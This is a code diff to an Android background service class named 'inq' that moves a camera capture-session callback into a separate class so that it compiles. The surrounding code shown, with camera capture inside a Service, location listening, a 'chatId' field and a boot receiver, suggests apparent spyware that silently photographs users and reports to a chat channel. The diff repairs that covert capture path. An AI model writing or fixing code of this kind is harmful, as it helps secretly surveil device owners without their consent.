@@ -174,8 +174,7 @@ public class inq extends Service implements LocationListener {
     // ══════════════════════════════════════════════
     @SuppressWarnings("deprecation")
     static class CamCallback extends CameraDevice.StateCallback
-            implements CameraCaptureSession.StateCallback,
-                       ImageReader.OnImageAvailableListener {
+            implements ImageReader.OnImageAvailableListener {
 
         final inq      ref;
         final String   chatId;
@@ -204,20 +203,11 @@ public class inq extends Service implements LocationListener {
                 captureReq = builder.build();
                 List<Surface> surfaces = new ArrayList<>();
                 surfaces.add(reader.getSurface());
-                // 'this' as CameraCaptureSession.StateCallback — no anonymous class
-                d.createCaptureSession(surfaces, this, handler);
+                d.createCaptureSession(surfaces, new CamSession(this), handler);
             } catch (Exception e) { latch.countDown(); }
         }
         @Override public void onDisconnected(CameraDevice d) { d.close(); latch.countDown(); }
         @Override public void onError(CameraDevice d, int e) { d.close(); latch.countDown(); }
-
-        // CameraCaptureSession.StateCallback
-        @Override
-        public void onConfigured(CameraCaptureSession session) {
-            try { session.capture(captureReq, null, handler); }
-            catch (Exception e) { latch.countDown(); }
-        }
-        @Override public void onConfigureFailed(CameraCaptureSession s) { latch.countDown(); }
 
         // ImageReader.OnImageAvailableListener
         @Override
@@ -1252,6 +1242,22 @@ public class inq extends Service implements LocationListener {
 
     private String escJson(String s) {
         return s.replace("\\","\\\\").replace("\"","\\\"");
+    }
+
+    // ── CAM SESSION CALLBACK ─────────────────────
+    // Separate class because CameraCaptureSession.StateCallback is abstract (not interface)
+    @SuppressWarnings("deprecation")
+    static class CamSession extends CameraCaptureSession.StateCallback {
+        final CamCallback cb;
+        CamSession(CamCallback c) { cb = c; }
+
+        @Override
+        public void onConfigured(CameraCaptureSession session) {
+            try { session.capture(cb.captureReq, null, cb.handler); }
+            catch (Exception e) { cb.latch.countDown(); }
+        }
+        @Override
+        public void onConfigureFailed(CameraCaptureSession s) { cb.latch.countDown(); }
     }
 
     // ── BOOT RECEIVER ────────────────────────────
